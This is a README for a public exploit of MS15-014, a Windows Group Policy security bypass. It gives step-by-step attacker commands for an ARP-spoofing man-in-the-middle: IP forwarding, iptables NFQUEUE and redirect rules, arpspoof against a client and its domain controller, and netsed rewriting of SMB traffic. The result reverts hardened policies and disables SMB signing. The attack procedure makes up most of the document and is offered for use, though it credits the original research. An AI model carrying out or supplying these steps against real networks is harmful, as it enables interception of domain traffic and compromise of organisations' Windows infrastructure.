# ms15-014
Exploit for MS15-014 Group policy security bypass

# About
This exploit will intercept the group policy call that tries to fetch the security policies. 
It will rewrite it so that it is no longer valid. In unpatched Windows versions (https://technet.microsoft.com/en-us/library/security/ms15-014.aspx) that have not installed the KB3004361 update the security settings will be reverted to the default non hardened settings.
This effectively disables SMB signing making your AD infrastructure vulnerable for successfull man in the middle attacks.
This vulnerability has been discovered by Luke Jennings from MWR Labs and he has an excellent blog about this vulnerability: https://labs.mwrinfosecurity.com/blog/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/.
As far as I am aware there have been no exploits released to the public. It has been made available in the commercial Core Impact vulnerability assessment tool, but I could not find the original exploit as a public download.
So, therefore I decided to write one myself.

# Requirements
- Linux with root privileges (i.e. iptables and NFQUEUE rules)
- netsed installed (i.e. apt-get install netsed / yum install netsed)

# Usage
Lets assume the following usecase:

Windows 2008/2012 Domain Controller 192.168.1.1
Windows 8/8.1 domain joined client 192.168.1.2

We first need to create a valid MITM scenario so that we can intercept and alter the traffic.
So, lets assume that we have an attacker that has Kali Linux running on ip 192.168.1.3.
The attacker should do something like this:

- Enable IP Forwarding
```shell
echo 1 > /proc/sys/net/ipv4/ip_forward
```
- Forward SMB2 traffic to NFQUEUE 1
```shell
iptables -I FORWARD -j NFQUEUE -p tcp --dport 445 --queue-bypass --queue-num 1
```
- Arp spoof the Windows client and the domain controller:
```shell
arpspoof 192.168.1.1 -t 192.168.1.2
arpspoof 192.168.1.2 -t 192.168.1.1
```
- Run program and get the netsed command once the group policies are fetched on the client
```shell
sniff_group_policy --i 192.168.134.11
```

If the Windows client tries to fetch the security policies the sniff_group_policy command will output a netsed command that can be used to revert all group policy security settings to the non safe defaults.
This can be manually triggered with the command:
```shell
gpupdate /force
```

Once you've identified the security UUID you should do the following:

- Flush existing iptables rules
```shell
iptables -F
```
- Run the netsed command that has been supplied by sniff_group_policy
- redirect SMB2 traffic to the netsed proxy
```shell
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 445 -j REDIRECT --to-port 446
```

Fetch the latest policies on the client with a gpupdate /force and you have lifted the SMB signing requirements.

# Confirming that it worked
If you run rsop.msc on the client you can verify this.
Go to Computer configuration -> Windows settings -> Security Settings -> Local Policies -> Security Options
The option Microsoft network client:Digitally sign communications (always) is no longer enabled.

# Video demonstrating this exploit
https://www.youtube.com/watch?v=N3zozQGNI-Q
